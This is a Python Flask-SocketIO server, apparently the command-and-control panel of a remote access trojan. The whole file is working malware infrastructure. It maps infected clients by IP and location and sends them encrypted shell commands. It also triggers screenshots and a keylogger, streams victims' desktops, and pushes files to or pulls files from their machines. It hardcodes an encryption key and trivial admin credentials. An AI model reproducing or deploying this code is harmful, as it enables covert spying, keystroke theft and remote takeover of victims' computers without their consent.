#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
# server.py (Servidor Flask-SocketIO)
#______________________________________________________________________________________________________________________

from flask import Flask, render_template, request, redirect, url_for, session
from flask_socketio import SocketIO, emit
import folium
import json
from cryptography.fernet import Fernet
import base64
import datetime
import os
import requests


# Generar una clave AES segura (debe ser la misma en el cliente y servidor)
SECRET_KEY = b'q8A7E1x2XmNnWlBhFqZpL4d6KNZTSPBJaIrjNGYdHbA='  # Generar con Fernet.generate_key()
cipher = Fernet(SECRET_KEY)

app = Flask(__name__)
app.secret_key = "supersecreto"  # Cambia esto por una clave más segura
socketio = SocketIO(app, cors_allowed_origins="*")

# Datos de usuario (puedes cambiarlo por una base de datos)
USERS = {
    "admin": "admin",
    "usuario": "password"
}

clientes = {}  # Almacenar clientes conectados

@app.route("/")
def index():
    return redirect(url_for("login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        if username in USERS and USERS[username] == password:
            session["user"] = username  # Guarda el usuario en sesión
            print("Sesión guardada:", session)  # Agrega este print para depuración
            return redirect(url_for("index2"))

        return render_template("login.html", error="Credenciales incorrectas")

    return render_template("login.html")

@app.route("/index")
def index2():
    if "user" in session:
        return render_template("index.html", user=session["user"])
    return redirect(url_for("login"))

@app.route("/logout")
def logout():
    session.pop("user", None)  # Elimina la sesión del usuario
    return redirect(url_for("login"))

@app.route("/panel")
def panel2():
    if "user" in session:
        return render_template("panel.html", user=session["user"])
    return redirect(url_for("login"))
    

@socketio.on('registrar_cliente')
def registrar_cliente(data):
    ip = data["ip_publica"]
    clientes[ip] = data
    print(f"[+] Cliente registrado: {ip} - {data}")
    generar_mapa()  # Actualizar mapa
    socketio.emit('actualizar_mapa', clientes)

def generar_mapa():
    mapa = folium.Map(location=[0, 0], zoom_start=2)
    for ip, datos in clientes.items():
        lat, lon = map(float, datos["ubicacion"].split(','))
        folium.Marker(
            location=[lat, lon],
            popup=f"{datos['ip_publica']} {datos['nombre_equipo']} ({datos['sistema']} {datos['version']})",

            icon=folium.Icon(color='blue', icon='info-sign')
        ).add_to(mapa)
    mapa.save("static/mapa.html")

@socketio.on('send_command')
def handle_command(command):
    encrypted_command = cipher.encrypt(command.encode())
    print(f'Comando cifrado enviado: {encrypted_command}')
    socketio.emit('execute_command', encrypted_command.decode())  # Enviar cifrado

@socketio.on('command_output')
def handle_output(encrypted_output):
    decrypted_output = cipher.decrypt(encrypted_output.encode()).decode()
    print(f'Respuesta descifrada del cliente: {decrypted_output}')
    socketio.emit('display_output', decrypted_output)

@socketio.on('screenshot_in')
def handle_in():
    print('servidor enviando al cliente')
    #command_1 = 'screenshot'    
    socketio.emit('screenshot_command') 

@socketio.on('screenshot_output')
def handle_in(command_2):
    print(f'Recibiendo la imagen')
    try:
        with open("static/screenshot.png", "wb") as f:
            f.write(base64.b64decode(command_2))
        socketio.emit('update_screenshot', f"data:image/png;base64,{command_2}")
    except Exception as e:
        print("Error guardando captura de pantalla:", str(e))


@socketio.on('start_keylogger')
def key_in():
    print(f'Activar keylogger')
    socketio.emit('start_keylogger')

@socketio.on('keylog_data')
def receive_keylog(data):
    decrypted_data = cipher.decrypt(data.encode()).decode()
    socketio.emit('keylogger_data', decrypted_data)

@socketio.on('stop_keylogger')
def key_in():
    print(f'desactivar keylogger')
    socketio.emit('stop_keylogger')


@socketio.on('start_remote_desktop')
def start_remote_desktop():
    print(f'Enviando orden para Escritorio Remoto')
    socketio.emit('start_remote_desktop_client')

@socketio.on('stop_remote_desktop')
def stop_remote_desktop():
    print(f'Orden de Escritorio Remoto Detenida')
    socketio.emit('stop_remote_desktop_client')

@socketio.on('remote_desktop')
def receive_frame(image_data):
    try:
        image_bytes = base64.b64decode(image_data)
        filename = f"static/frame.png"
        with open(filename, "wb") as f:
            f.write(image_bytes)
        socketio.emit("remote_desktop_frame", filename)  # Enviar al frontend
        print("[*] Frame recibido y guardado.")
    except Exception as e:
        print("[!] Error guardando imagen:", str(e))

@socketio.on("send_file")
def send_file(data):
    filename = data["filename"]
    filepath = f"uploads/{filename}"  # Asegurar que los archivos están en uploads/
    
    try:
        with open(filepath, "rb") as f:
            file_data = base64.b64encode(f.read()).decode("utf-8")
        socketio.emit("receive_file", {"filename": filename, "data": file_data})
        print(f"[*] Archivo {filename} enviado al cliente.")
    except Exception as e:
        print(f"[!] Error enviando archivo: {str(e)}")


# Enviar orden al cliente para recuperar un archivo
@socketio.on("start_D")
def request_file():
    print(f'Solicitando el servidor de descarg de archivo')    
    socketio.emit("get_file")  # Enviar orden al cliente
    

# Recibir el archivo desde el cliente
@socketio.on("send_file_")
def send_file2(data):
    data_1 = str(data)
    print(f'Recibiendo el archivo....')    
    decrypted_data = cipher.decrypt(data_1.encode()).decode()
    socketio.emit('D_data', decrypted_data)

if __name__ == '__main__':
    os.makedirs("uploads", exist_ok=True)
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)


